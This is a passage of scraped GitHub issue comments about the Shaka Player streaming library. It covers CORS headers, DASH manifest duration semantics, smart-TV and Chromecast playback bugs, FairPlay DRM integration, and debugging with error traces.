in cross-origin requests, as I described before. This means the OPTIONS response must have:\nAccess-Control-Allow-Headers: Range, ...(other required headers here)...\nDoes that make sense?. To be clear, this is a feature request, not a bug. There's nothing wrong with NetworkingEngine as far as I know, it behaves as expected.\nYou mention this:\n\nDASH already supports fallback URIs, but they specify identical content, so it shouldn't matter which one we request. But your use case seems different because it sounds like different content.\n\nI think this is an interesting scenario, because it makes me wonder what DASH means by \"identical content\". With dynamic ad insertion, two users watching the same stream will see the same \"content\", but potentially different ads. I would argue this is \"identical content\" since there is no way for us to know the composition of the ad breaks ahead of time, only the timing of them.\nOur ads for live content are delivered via multi-period DASH. We expect to do the same for VOD in the future.\nOn reflection, I actually think that NetworkingEngine's current behaviour is fine for live, since we'll be fetching a new manifest every 6s anyway. If the user misses an ad break in some exceptional circumstances (i.e. they see some placeholder content during an ad break, instead of ads), this is not the end of the world. For VOD, we could just catch the manifest failure error and retry with the fallback URL. My only concern is if there would be some delay because of startup/teardown time. But this would also only happen under exceptional circumstances.\nI'll close this since it appears we are probably fine with the current behaviour. Thanks!. No, wait, reopening because we still want to be able to pass multiple URL's to Player.load().. The url passed to Player.load() is passed to a ManifestParser, which puts it in an array before passing it to NetworkingEngine anyway. Would Shaka accept a PR to allow Player.load() to accept an array of URLs?. Thanks for the suggestion. I'm not very familiar with xlink so I'd have to take a closer look.\nI actually think what might make the most sense is for our ad provider provider to respond with a redirect to the original URL if they aren't able to serve at the modified URL. I'll close this ticket for now. Thanks.. I realized that I could achieve what I want by registering a request filter for manifests and pushing my fallback url into request.uris.. This issue is easily reproduced in Canary with --enable-features=MseBufferByPts and the stream provided, see analysis here:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=844799#c33\nThis is now an issue for our video engineering group to tackle, so I will close. Maybe you'd like to tag as Chrome PTS/DTS?\nThanks for the help!. Hi @FeliceGeracitano, there is a ticket for HLS-FP support via native Safari player: https://github.com/google/shaka-player/issues/997\nI also recommend you read the discussion at https://github.com/google/shaka-player/pull/1199 and #382. That pull request is for com.apple.fps.2_0 support, but there is discussion of com.apple.fps.1_0. I'm not a member of Shaka team, so this is my own opinion, but I think that Shaka should not wrap the Safari player, because they are logically at the same level of abstraction. It would make more sense to define an interface and have two separate implementations: the existing shaka.Player and another shaka.SafariPlayer (or something similar).. Speaking strictly hypothetically, yes. Personally I would say the client application would need to decide which player implementation to use at some point.. @yairtal I'm curious about your use case. What is the video you are playing? Who is the audience? Also, what is your infrastructure? Where does this video come from?. The reason I ask about your use case is if you have relatively short, static, clear content, you could deliver video as a plain mp4 and the video element's loop attribute would do what you want.. ~I have only ever seen this happen so far with audio segments. A sample manifest is attached. One thing I notice is that we have three AdaptationSet for audio in each Period, each AdaptationSet has one Representation. The languages for all are eng and the segments appear to be the same, only the bitrate is different. On further testing, it seems to be no different if I remove 2 of the audio AdaptationSets and leave just one.~\nsample_multi_period.txt\n. The fix seems to be good. So far I haven't seen it get into making thousands of requests like it was before. However, I do still see it periodically request a segment a second time. Here I've sorted the requests in the Network tab by name:\n\n\nThe behaviour does not disrupt playback, but is there any reason why Shaka should request a segment twice?. I consider this issue resolved. I will file a new issue for the duplicate requests if I have an issue with it. Thanks.. FYI ChromeStatus says Chrome 70 stable is expected Oct 16:\nhttps://www.chromestatus.com/features/schedule. Thanks for the explanation Joey, wasn't sure if it was intentional or not.. I think this is the same as https://github.com/google/shaka-player/issues/1464. @jkringen can you be more specific about the device and OS? Are you developing for a smart TV platform or desktop browser-based platform?. In your demo app, I get 403 Forbidden on the request for shaka-player.compiled.debug.js, which leads to a ReferenceError: shaka is not defined. I am in Canada fwiw, although I get this error even when connected to my US VPN.. Very interesting. I want to say, in my experience, these kinds of HTML5-based Smart-TV / STB environments are notoriously unreliable and buggy. The only reason I mention this is that on Samsung Tizen TV's, we noticed a significant improvement in stability from 2016 WebKit-based TV's to 2017 Chromium-based ones.\nI would strongly urge you to ask Enseo for a proof of concept demonstrating a working MSE-EME implementation, do not just take their word for it.\nAre you able to get any playback working at all with Shaka player? Clear content? PlayReady-protected test content? You can find many PR test assets in the Shaka demo app:\nhttps://shaka-player-demo.appspot.com. @jkringen Do you know what version of the EME spec Enseo has used?. Thank you!. Is this the same as https://github.com/google/shaka-player/issues/1476 ?. Keep in mind that there may be multiple Player instances running at once (e.g picture-in-picture, tiled playbacks). Here is a use case for which the use of a singleton seems problematic to me: As a Shaka client developer, I want to be able to add a header to segment, manifest, and license requests, on a per-stream basis. (We need to track requests for specific streams with a unique GUID.) Keeping in mind that a stream URL may change over the course of playback, how will I differentiate between multiple streams playing at the same time?\nSimply making the code base easier to work with does not seem like a motivating reason to introduce a singleton, IMO. I worry that many use cases (potentially new and unexpected ones) would be adversely affected by such a change. If I am ignoring an obvious solution to the above use case, please let me know!. We use JSPM for package management and bundling. I'm not intimately familiar with JSPM, but based on my reading, it is configured to read shaka-player.compiled.js as a CommonJS module, and then expose this to use in ES6 module style.\nCould the method of export be configured at build time via a flag?. Important detail I forgot to mention: we don't track Shaka as a dependency via npm. I believe there was once a reason for this but I'm hard-pressed to think of it now. Switching it over to npm may obviate the need for es6 module definition. Let me get back to you.. From discussion in #1148 it seems unclear if the duration must be known at the start of playback.. >Is the duration you set the duration of the content in the manifest or is it longer than the content available? If we didn't do a manifest update, could we play to the duration or would it run out of available content?\nThe duration is the duration of the content available. On inspection I see that mediaPresentationDuration is one segment length longer than the sum of all segments described in the manifest. We are using 6s segments. For example:\n<MPD availabilityStartTime=\"2018-07-30T16:45:07.578Z\" mediaPresentationDuration=\"PT2M54.174S\" minBufferTime=\"PT4S\" minimumUpdatePeriod=\"PT6.006S\" profiles=\"urn:mpeg:dash:profile:isoff-live:2011\" publishTime=\"2018-07-30T16:48:54.000000Z\" type=\"dynamic\" xmlns=\"urn:mpeg:dash:schema:mpd:2011\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd\" xmlns:cenc=\"urn:mpeg:cenc:2013\" xmlns:mspr=\"urn:microsoft:playready\">\n  <Period duration=\"PT2M54.174S\" id=\"0zB9AK2PRki_2B81Zp6jYA\" start=\"PT0S\">\n...\n      <SegmentTemplate initialization=\"pts/init.mp4\" media=\"pts/$Time$.m4f\" presentationTimeOffset=\"369804134700\" startNumber=\"0\" timescale=\"90000\">\n        <SegmentTimeline>\n          <S d=\"540540\" r=\"28\" t=\"369804134700\" />\n        </SegmentTimeline>\n      </SegmentTemplate>\nGenerally, in each subsequent manifest request, mediaPresentationDuration is increased by 6.006s, and S@r is incremented by 1. Without doing a manifest update, you could play this content to completion.\n\nThe idea of IPR is that we know the duration ahead of time; if you are changing the duration, why not use a normal live stream? Once the live stream ends you can convert it to VOD.\n\nThis stream is converted to VOD once the recording is complete. At that time the MPD becomes type=\"static\". I'm not sure why we don't use a live stream for the in-progress portion, I'll check with our packaging team.. @TheModMaker My team did some troubleshooting on an identical issue in late January this year. The ticket was eventually closed because I was unable to reproduce what others were seeing, and we launched with the feature in beta. At the time we were using Shaka v2.2.8 and I observed that the player was able to update the duration of an in-progress recording. However, I believe our headend services and content have changed since then. When I try to play this content with v2.2.8 now, it doesn't work, it stops at the recorded duration.\nLooking at our old ticket, I see this is the feedback we received from our packager:\n\nThe MediaPresentationDuration is constantly updated in the dash MPD as we add segments to it during the recording state, so if the player is only using the initial MediaPresentationDuration and its not adjusting it due to the addition of new segments then that's likely a player issue. The player should be re-requesting the dash MPD while playing out to get the updated new video segments as they are added so it should be fully aware of the new MediaPresentationDuration. It seems it's easy to force to player to treat the IPR as live just by removing mediaPresentationDuration from the manifest, which I can do in a response filter. This allows the player to play past the initial recorded duration. I will keep testing to see what happens when the presentation ends.. I see that if I just remove mediaPresentationDuration from the manifest, playback proceeds normally. When the recording ends, the stream is converted to VOD and playback ends as expected. This is a bit of a hack so I'd prefer to avoid doing this if possible.\n\nHow big is the change to add support for updating duration throughout playback? I'd be happy to add this functionality if I could be pointed to some of the key areas of the code. I made a change to StreamingEngine#append_ to call this.setDuration_() after appending a new segment. The duration would update throughout playback, but playback still stalled after the initial recorded duration. What other changes would be required?. After some more reading of the spec, I think it's the content that is wrong. From ISO/IEC 23009-1:2014(E), 5.3.1.2 Semantics, Table 3:\n\n@mediaPresentationDuration specifies the duration of the entire Media Presentation. If the attribute is not present, the duration of the Media Presentation is unknown.\nThis attribute shall be present when neither the attribute MPD@minimumUpdatePeriod nor the Period@duration of the last Period are present.\n\nAlso in IOP 4.2, section 4.6.4 Transition Phase between Live and On-Demand\n\nIn the scenario for which the same MPD URL is used for live and On-Demand content, once the URL and publish time of the last Segment is known for the live service, and the duration of the service is known as well, the service provider acts as defined in clause 4.4.3.1, i.e.,\n- adds the attribute MPD@mediaPresentationDuration\n\nI will close. Please label \"Working as intended\". Thanks!. If you are asking about native app development, video playback on iOS is generally handled exclusively by Apple's AVPlayer using HTTP Live Streaming (HLS).\nIf you want to play video in a browser on iOS, Shaka does not support this yet, but you can follow progress on #997. You can play streaming video in Safari on iOS using the <video> element.\nFor streaming video playback in native apps on Android, the Google standard is ExoPlayer, though there are other alternatives on Android. If you would like to play video in Chrome on Android (or via Progressive Web App), Shaka supports this.\nYou can also use Shaka in TV/set-top-box HTML5 environments (Tizen 2017 TV's are officially supported).. @TheModMaker since networking plugins synchronously return an AbortableOperation, it seems it would not be possible to use async/await, since I need an explicit reference to the Promise to pass to AbortableOperation.. Thanks for the tip, I will see what I can do.. @pix-dgee There were a lot of changes between 2.2.7 and 2.4.2, I would recommend you test with each intermediate version to see when the problem appears.\nThis is just a thought, but a colleague had some similar-sounding seek-related problems at the start of playback. He was able to resolve them by lowering the value of Playhead.MIN_SEEK_RANGE_ to 1.5. See https://github.com/google/shaka-player/commit/a039c66cac3308356c43c12bccd50e112fb3d916. @theodab I don't mind sending in a PR if we agree on a design.. Sounds good, thank you!. Thanks, @theodab!. I'm also curious about the purpose of soft restrictions in https://github.com/google/shaka-player/commit/ed0f37b0990ea9a4a40e6c1779822794367ab7f8 . Why allow ABR to pick a variant if all are restricted?. Oh strange, how did I miss that?. That's an even better idea. A simple synchronous call that allows the client to tell Shaka whether it should do MediaSource work or not.. @TheModMaker I get requests all the time from other teams in my org to improve player resiliency. Often the org wants to go to extreme (and IMO unreasonable) lengths to ensure the player makes every possible attempt to play something before producing an error. This is ostensibly to improve user experience, but mostly has to do with keeping the error rate down. There is an engineer who sits next to me whose sole job is to investigate error rates and video start time on web clients. I am sympathetic to @sandeep-mirpuri 's plight; demand for these types of features is strong, even if the engineering basis for them is weak.. I think this is similar to #1051. This is not related to fullscreen, but is related to custom controls. Some CSS properties such as transition and opacity can cause video rendering problems in IE11 and Edge. We saw this in our test application when the video element would stay completely black after playback had started, until we clicked on the browser window.\nI believe this is related to behaviour of independent composition described here:\nhttps://msdn.microsoft.com/en-us/library/jj680148(v=vs.85).aspx\nI never got around to filing a bug with MS about it, but fyi in case it's useful to you.\nEdit: also client developers should be mindful of UI tools that polyfill DOM classes, e.g. #1349. @joeyparrish If you file a ticket listing requirements for a DASH analysis tool, I may be able to get it assigned to someone on my team. We face similar troubleshooting scenarios frequently, so I think we could contribute.. Sounds good to me @TheModMaker. No new method required this way.. There is the question of what to do with this assertion:\nshaka.media.PresentationTimeline.prototype.getLiveEdge = function() {\n  goog.asserts.assert(this.presentationStartTime_ != null,\n                      'Cannot compute timeline live edge without start time');\nUsers who call this for VOD will get a failed assertion. Could we not say, for VOD, that presentationStartTime is zero? The spec says, for MPD@availabilityStartTime:\n\nFor @type=\"static\" if present, it specifies the Segment availability start time for all Segments referred to in this MPD. If not present, all Segments described in the MPD shall become available at the time the MPD becomes available.\n\nI think that \"all Segments described in the MPD shall become available\" can be interpreted to mean that AST is, by default, zero. Agree/disagree?. Oh yeah, that's perfect! Thanks Joey. Does this depend on #1504?. Is this what you mean?\n\n. On macOS, I am also able to reproduce in Firefox 62. Doesn't happen on Chrome 69.. A few questions:\n1. Are you doing this just for VOD? Or do you support seeking (e.g. backwards) in Live?\n2. What is your lowest bandwidth video Representation?\n3. If VOD, how long are your assets? A few minutes? 30 minutes? An hour? 2+ hours?\n4. Are you playing ads? Is your content multi-period?. A few questions:\n1. Are you doing this just for VOD? Or do you support seeking (e.g. backwards) in Live?\n2. What is your lowest bandwidth video Representation?\n3. If VOD, how long are your assets? A few minutes? 30 minutes? An hour? 2+ hours?\n4. Are you playing ads? Is your content multi-period?. There is not really a good solution here, that I can think of. The key problem is that, for thumbnails, you presumably want to prefetch this content, because the user may attempt to scrub to any point in the video at any time. If you fetch the thumbnails on-demand, it will likely be too slow to be useful. (I could be wrong on this point, I've never tested this.)\nPrefetching would likely consume too much bandwidth. 112kbps * 300s = ~33 Mb. This means that for a 5-minute video, you will have to prefetch 33 Mb of video data in order to provide thumbnail support. For a 1hr video, the amount is closer to 400Mb.\nI imagine (but again I may be wrong) that users do their scrubbing at the start of playback, presumably to get to the point where they want to start watching, then watch the content to completion (or stop at some point). This means you wouldn't be able to prefetch the thumbnail video data in time to actually use it.. There is not really a good solution here, that I can think of. The key problem is that, for thumbnails, you presumably want to prefetch this content, because the user may attempt to scrub to any point in the video at any time. If you fetch the thumbnails on-demand, it will likely be too slow to be useful. (I could be wrong on this point, I've never tested this.)\nPrefetching would likely consume too much bandwidth. 112kbps * 300s = ~33 Mb. This means that for a 5-minute video, you will have to prefetch 33 Mb of video data in order to provide thumbnail support. For a 1hr video, the amount is closer to 400Mb.\nI imagine (but again I may be wrong) that users do their scrubbing at the start of playback, presumably to get to the point where they want to start watching, then watch the content to completion (or stop at some point). This means you wouldn't be able to prefetch the thumbnail video data in time to actually use it.. @joeyparrish you mentioned earlier \"Without a clear way to debug at the JS level on the device, this will be tricky to track down.\"\nHave you been able to deploy a Tizen application running a Chrome debugger? It is possible. I think I previously wrote a guide on how to set this up, I can dig it up if it would be helpful.. @avelad Are your streams still available for testing? My team is looking at this issue as well and we are hoping to get Samsung to follow up. If your streams are up, they can probably use them for testing too.. Thank you, @avelad.\nWe have this issue as well but, curiously, we only see the problem on 2018 TV's with our streams. Our 2017 TV's are apparently unaffected. Are you able to confirm what model year TV you are using?\nMy understanding of the situation is that Samsung is aware of the problem and a fix is planned for a future firmware update (which I think happen roughly quarterly).. @avelad I will need to get back to you in the new year as I am off for holidays now.. @stiankraggerud this is a Samsung bug and it's my understanding that they have a fix planned for their next firmware update cycle, which I expect in about 3 months.. Automated end-to-end tests may be an idea. These are effectively mini-applications on their own and can serve as references for clients on how to use API's. One drawback is that automated tests are accompanied by test code boilerplate, but you could address this by extracting code to a separate module, which could be reused by both an automated test suite and a traditional reference application.\n. @krvangala If you are asking about how much video is buffered at any given moment, you can obtain this information from the video element:\n```\n// Get your video element\nconst videoElement = document.querySelector('video');\n// This is a TimeRanges object, see: https://developer.mozilla.org/en-US/docs/Web/API/TimeRanges\nconst buffered = videoElement.buffered;\n// There could be multiple buffered ranges, so you will need to find the one you want.\nfor (let i = 0; i < buffered.length; i++) {\n  console.log(buffered.start(i), buffered.end(i));\n}\n```\nLet me know if this is useful to you.. I don't have a Windows machine handy, but quick question: can you confirm the first request is not a preflight OPTIONS request?. You'll want to take a look at the License Wrapping tutorial:\nhttps://github.com/google/shaka-player/blob/master/docs/tutorials/license-wrapping.md. @tylerdaines thanks for your work on this, this will help my team too. :). I'm a bit confused. Your first image appears to show Tears of Steel playing. So, does it play?\nHave you checked the debugger for any output to the console?. This may be interesting to all parties: https://github.com/tc39/proposal-bigint. We would probably also be interested in this.. Do you know what variant is playing (or trying to play) when you get the error?\nI noticed there are a few AdaptationSets for video, with a variety of codecs. Some of these Tizen may not actually support (even if they claim they do). I would recommend removing variants from the manifest until it plays for you, then find the problematic codecs.\nOtherwise, this is just an error from the Tizen media stack and there's nothing we can know about it. :(. @vaage Unfortunately I don't know. We don't use those codecs in our project, so far as I'm aware.. Are you using multiple instances of shaka.Player to play this video?. Yes, you can force which DRM you want to use, by configuring Shaka for the key system you want (and excluding the ones you don't want). I know this because I also do this on Tizen to force PlayReady.\nThis sounds a bit fishy, either there could be a new Shaka bug or you are misconfiguring the player. Could you share your code where you configure the player?. @kevinscroggins-youi I am in Ontario so I took a look at your content and reproduced your issue using Shaka v2.4.6.\nHlsParser#getStartTime_ throws HLS_COULD_NOT_PARSE_SEGMENT_START_TIME because mimeType is audio/aac, which is apparently not supported (see issue #1083). @vaage does this make sense? If you have any follow-up questions let me know and I'm happy to test again.\nSee the state of HlsParser at the point of the error below:\n\n. @waxidiotic I get the following CORS error when I try to load the page you linked to:\n\nAccess to fetch at 'https://widevine.licensekeyserver.com/' from origin 'https://s3.amazonaws.com' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The 'Access-Control-Allow-Origin' header contains multiple values ', ', but only one is allowed. Have the server send the header with a valid value, or, if an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.\n\nThis appears to be a CORS misconfiguration on your server. See the response to the OPTIONS request below:\n\n. This looks the same as #1542 . If I've understood correctly it sounds like the Widevine server will return an error. So your license proxy should be configured to understand that error and send an error response back from the license request. Sending an error response back will cause Shaka to publish 6007 LICENSE_REQUEST_FAILED. Your client app should inspect this error to determine if the failure is because the user's CDM is out of date.. Our product doesn't currently support offline playback on web platform, so I don't use the storage API's at all. It's something I'd like to add in the future though.\nSo, this is coming from the perspective of someone who hasn't used storage, and I'm not even sure what the current capabilities are. But at a high level what I would like to do:\n- Store VOD content for offline playback (use case: download ahead of time, and e.g. watch on a flight)\n- Eagerly fetch and store VOD content during periods of intermittent network connectivity (use case: streaming while e.g. commuting or on a long drive)\n- Store Live content (perhaps hours worth) for the purposes of supporting Live pause. Updated.. I created this spy but don't actually use it for anything. Suggestions?. Done.. I've left this as is. The new behaviour is already covered by a unit test, and I noticed that onExpirationSpy is similarly unused in drm_engine_integration. I'll leave it to you guys to decide whether you need these spies.. Updated.. I believe this is only the case in com.apple.fps.1_0.. I don't know if there is a method for providing init data via an HLS manifest.. The demo in the FPS SDK does this, but I believe it is application-specific business logic. None of the Fairplay license proxies I work with expect this behaviour from clients.. This isn't necessary for com.apple.fps.2_0. Here as well, I've never seen CKC-wrapped license responses from the servers I've worked with. The application can handle this via response filters.. The application should still have a way of getting the contentId, but I think it could be an event from the player.. I am not a Fairplay / license proxy expert so I asked our CWIP guy down the hall, and he tells me that it is not comparable to the Widevine flow. The Fairplay license proxy expects that the license challenge is already signed with the certificate.. Is your concern that the app will now be required to provide a certificate to Shaka for Fairplay playback, whereas it is optional for Widevine? Is this what you mean by \"special case\"?\nEME says:\n\nsetServerCertificate\nProvides a server certificate to be used to encrypt messages to the license server.\nKey Systems that use such certificates must also support requesting the certificate from the server via the Queue a \"message\" Event algorithm.\n\nSince Safari doesn't implement the latest spec, and doesn't have this API, and we can't predict whether Apple will eventually implement it, or if the implementation will follow the spec, it may not be possible to avoid a special case for Safari.. I made this change to make it easy to expect jasmine.any(Object) when checking the error.. I actually agree with @joeyparrish, there should not be unchecked errors, so I added an assertion.. If the definition of TimelineRegionInfo is changed so that TimelineRegionInfo#eventElement is nullable, you could create a TimelineRegionInfo out of an EmsgInfo. But I have no idea if this makes sense. I'm assuming that clients will be able to differentiate based on schemeIdUri, but this could also be a breaking change for clients that already depend on timelineregion* events for EventStream behaviour.\nCan you advise?. Looks like this behaviour (passing arbitrary params from the command line) is still to be implemented.. ",
    "aibolik": "Hi. Whom I can refer to get updates on the work progress of supporting CEA 608/708 captions for native TS support platforms, more precisely for Chromecast. \nI see that Chromecast with CAF uses Shaka Player v 2.2.10, but the latests in the repository is 2.3 with some bug fixes and features. Does anyone know when new version will be added to CAF?\nP.S.: don't you mind adding badge with the version? Thanks. @joeyparrish I meant something like this, just a tiny thing.\n\n. @joeyparrish exactly, badge with current release would be informative.. ",
    "theodab": "I have a CL in progress for that. It should be ready for review today.. This appears to be the result of a Chrome bug. The HTMLVideoElement is incorrectly reporting its currentTime after the pause, so Shaka Player loads the wrong segments. I've filed a bug report for it, https://bugs.chromium.org/p/chromium/issues/detail?id=680256.. The bug is triggered by pausing directly after seeking backwards into an unbuffered region. For now, you can try to pause before seeking and it should work fine.. I just tested on chrome 56.0.2924.87 on OSX and reproduced the bug. I'll look into it.. Further testing shows that this issue does not occur on 57.0.2987.74 (Chrome Beta) or 58.0.3004.0 (Chrome Canary). Chrome 57 is projected for a stable release in mid-March.. It looks like there might not be enough information in iframe playlists generated by apple's tools to satisfy MediaSource.\nI won't be able to work on this for a while. If anyone else wants to work on it, I have a WIP you can reference.. Those code samples aren't enough for me to personally replicate your issue.\nHowever, I did notice that when destroying the cast proxy, you do nothing with the return value when calling castProxy_.destroy().\nCastProxy.destroy() is an asynchronous method, and it returns a promise that is fulfilled when the CastProxy is fully destroyed.\nNot waiting for the proxy to be fully destroyed before setting everything to null could possibly be the source of your problem.\nYou could rewrite that unload method to be something along the lines of...\nvar destroyPromise = (isAvailable ? castProxy_.destroy() : Promise.resolve());\ndestroyPromise.then(function() {\n  // the rest of the unload method goes here\n});. Okay, I fixed a bug and changed the behavior of the cast sender so that you can re-connect to a session properly after destroying it.\nHowever, that example code you sent me does have some bugs. I've made a modified version with the changes you'll want to make pointed out in comments. I'll send it to your email.. It's possible, since these changes are smallish bugfixes and not major feature work, but that decision is up to Joey.. This is not actually be a race condition. Instead, it's an issue with the logic for detecting audio-only assets; we currently check if a track is video or audio by the presence of a 'width' variable, but the resolution attribute in HLS is optional so some manifests might not contain in. In such manifests, we are mis-identifying video streams as being audio.. As an update...\nIt looks like they have finally settled on a design for aborting fetches.\nThe AbortController has been implemented but not flighted on Edge, Mozilla has an implementation in 55+ nightly, and Chrome is planning on adding it soon. So it might not be too long till we can use Fetch.. We now have a fetch request scheme plugin. Note that, because this requires both the fetch API and the AbortController API, as of this moment it will only be used on Firefox and Edge.. I've tried that manifest with bitmovin's HTML5 player and with dash.js, and it didn't work on either of them. So it might be bad content. I'll investigate more.. I've reproduced this. This bug appears to have been introduced in \ne5ce395f37c9a57d7aa4601f7eb578afaf030617, where we added gap jumping.. I tried this out on a Chromecast with newer firmware. The problem didn't happen there, so it looks like it's a Chromecast bug of some sort. Once they update, this will no longer be a problem.. Specifically, it works on 1.25, while our normal test Chromecast is 1.22.. I've reproduced the issue. It looks like it also happens if the end of the buffered range has reached the end of the video, not just if the video has ended.\nIt definitely looks like a polyfill issue; if I disable the MediaSource polyfill it works better. I'll look into fixing it.. I tried to reproduce this now, running 11.0.2, and I can't reproduce this anymore.\nSo I guess it was an issue on Safari's end, and it's fixed now? Or maybe over the past 120 days I have totally forgotten how to reproduce it, but I think it's that first one.\nTentatively closing for now.. A duplicate issue for this was also filed, #1027.\nFor reference, the duplicate did mention that these licensing problems do not happen on Android 6 and 7, only 5. I will rename this issue to reflect that new information.. This issue appears to be a duplicate of #1023. I will close this one, since the older issue has more discussion.. Looking over the caption mp4s, I think see the problem.\nOur mp4 ttml parser assumes that an mp4 will only have a single mdat with ttml inside. These samples, however, have two mdats containing ttml each. Therefore, we end up ignoring the first mdat, and only using the second one... and the second mdat has only a single ttml cue in it, and that cue has a duration of 0.\nThis should be fairly simple to fix. Thanks for pointing it out.. Well, I got the change out now, so you can just pull from master.. On reflection I'm not entirely sure if this is a bug, or if it's bad content, but I can't find a spec for ttml in mp4 so I'll leave the bug label for now.\nThis... bug (?) should be present in 2.0, but this change will only work after the ttml parser refactoring in 2.1.. I tried it out in the demo. Your example asset doesn't work in the v2.3.0 demo for non-caption-related reasons, but in the nightly build demo it works fine for me. Have you tried out the nightly?. When you say you have the MPD content already, do you mean that you have already retrieved the manifest but have yet to parse it, or do you mean that you have retrieved the manifest and parsed it and now need Shaka Player to use the data?\nIf you have yet to parse the manifest, you might want to make a custom networking plugin. You can register one with shaka.net.NetworkingEngine.registerScheme, and it will be used by our existing DASH parser if you provide an uri that uses the custom scheme you registered it under. You can look at lib/net/http_plugin.js if you want an example.\nIf you have parsed the manifest already, and just want to translate your internal parsed manifest format into our parsed manifest format, then a custom manifest parser that ignores the uri and doesn't make any network requests is probably the way to go after all. Unless you make a custom networking plugin anyway and just send over the un-parsed raw manifest and parse it again, I suppose.. We looked into switching over to Typescript before, but decided to stick with Closure. I'll have to consult with Joey about adding Typescript support. If we have to maintain declarations files in addition to our existing externs, it'll probably add a lot of maintenance, so we'll see.. We don't pay attention to any response headers when requesting manifests, at the moment, no.\nAt the moment we just base the update period off of minimumUpdatePeriod (for DASH) or EXT-X-TARGETDURATION (for HLS).\nWe could modify the DASH and HLS parsers to add this as a configurable option, I suppose.. I've reproduced it. It looks like it only happens when seeking backwards, which makes sense since you only jump gaps forward.\nWhen I see it happen, it looks like it is momentarily going to the new position and then jumping back to where it was before, so it does look like it's gap-jumping.\nI'll see if disabling long gap jumps when seeking messes up anything.. On further inspection, this appears to be a race condition within the playhead.\nThe playhead has a timer that checks if it should gap jump, every 0.25 seconds. We use the 'seeking' event to check whether we should clear the buffer after a seek, and the 'seeking' event is asynchronously fired after currentTime is changed. There is the possibility that currentTime is changed, the playhead decides to gap jump back to its previous position, and THEN the 'seeking' event is fired. That means that this is not a Chromecast specific error, it is simply more likely to happen on slower platforms such as Chromecast.. Oh, this fix needs to be on the cast receiver, and we don't have cast receiver nightly builds, so while the issue is closed you won't be able to see it on the nightly. Just FYI.. Shaka Player has its own promise polyfill, which is installed by shaka.poyfill.installAll() if window.Promise isn't defined. Does the problem still happen if you don't import the core-js promise polyfill?. Ah, I didn't see that you had addressed that already. My apologies.\nAnyway... I'm looking at es6.promise.js, and it looks like their implementation of Promise.all assumes that promises conform to the iterable protocol. We don't use that protocol, to reduce the number of polyfills we need to maintain.\nSo maybe it's using our implementation of promises, but core-js has overwritten our implementation of Promise.all? I'll look into it further when I have the spare time.. Okay, I've done more testing, and I think this might just be a bug with core-js.\nI tried loading only the core-js promise module into a browser, without Shaka Player, and typed\nPromise.all([Promise.resolve()])\ninto the IE browser console, and it threw an exception about [object Object] not being iterable.. Looking at core-js's github page, it seems this might be a case of using core-js improperly.\nSee this and this issue. They warn against using files in core-js/modules/*, as they are internal and not meant to be directly linked unless you really know what you are doing. Instead, they say to include core-js/fn/promise if you want promises.. It looks like we just need to update the cast receiver app. I uploaded the most recent Shaka version to the debug id, and it worked fine.. In Shaka Player v2.2.3, I wasn't able to reproduce this on a 2nd generation Chromecast with cast firmware v1.27.96538, but could on an Ultra with cast firmware v1.22.74257. Thus the underlying cause of the crash might have been fixed in a firmware update, or it could be a new thing in the Ultra. I'll need to find an Ultra with up-to-date firmware to be sure.. Testing this on our shiny new Chromecast Ultra with up-to-date firmware, I am not seeing this exact crash anymore. However, I am seeing a new (?) bug with the same repro steps.\nAfter seeking back and forward for a minute or two, I get a 3015 (MEDIA_SOURCE_OPERATION_THREW) error, a 3016 (VIDEO_ERROR) error, and a 3014 (MEDIA_SOURCE_OPERATION_FAILED) error. The exact order tends to vary, and here's an example of the error objects (these were generated using the debug cast receiver, but the crash happens with the compiled one too):\ncategory: 3\ncode: 3016\ndata: Array(3)\n0: 3\n1: null\n2: \"PIPELINE_ERROR_DECODE\"\nlength: 3\n__proto__: Array(0)\nhandled: false\nmessage: \"Shaka Error MEDIA.VIDEO_ERROR (3,,PIPELINE_ERROR_DECODE)\"\nseverity: 2\nstack: \"Error: Shaka Error MEDIA.VIDEO_ERROR (3,,PIPELINE_ERROR_DECODE)\u21b5    at new shaka.util.Error (https://casttest-dot-shaka-player-demo.appspot.com/lib/util/error.js:72:13)\u21b5    at shaka.Player.onVideoError_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/player.js:2766:17)\"\n__proto__: Object\ncategory: 3\ncode: 3015\ndata: Array(1)\n0: stack: \"Error: Failed to execute 'appendBuffer' on 'SourceBuffer': The HTMLMediaElement.error attribute is not null.\u21b5    at shaka.media.MediaSourceEngine.append_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/media_source_engine.js:575:36)\u21b5    at shaka.media.MediaSourceEngine.enqueueOperation_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/media_source_engine.js:734:17)\u21b5    at shaka.media.MediaSourceEngine.appendBuffer (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/media_source_engine.js:397:15)\u21b5    at shaka.media.StreamingEngine.<anonymous> (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1565:52)\u21b5    at <anonymous>\"\n__proto__: Object\nlength: 1\n__proto__: Array(0)\nhandled: false\nmessage: \"Shaka Error MEDIA.MEDIA_SOURCE_OPERATION_THREW (InvalidStateError: Failed to execute 'appendBuffer' on 'SourceBuffer': The HTMLMediaElement.error attribute is not null.)\"\nseverity: 2\nstack: \"Error: Shaka Error MEDIA.MEDIA_SOURCE_OPERATION_THREW (InvalidStateError: Failed to execute 'appendBuffer' on 'SourceBuffer': The HTMLMediaElement.error attribute is not null.)\u21b5    at new shaka.util.Error (https://casttest-dot-shaka-player-demo.appspot.com/lib/util/error.js:72:13)\u21b5    at shaka.media.MediaSourceEngine.enqueueOperation_ (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/media_source_engine.js:743:28)\u21b5    at shaka.media.MediaSourceEngine.appendBuffer (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/media_source_engine.js:397:15)\u21b5    at shaka.media.StreamingEngine.<anonymous> (https://casttest-dot-shaka-player-demo.appspot.com/lib/media/streaming_engine.js:1565:52)\u21b5    at <anonymous>\"\n__proto__: Object\ncategory: 3\ncode: 3014\ndata: Array(1)\n0: 3\nlength: 1\n__proto__: Array(0)\nhandled: false\nmessage : \"Shaka Error 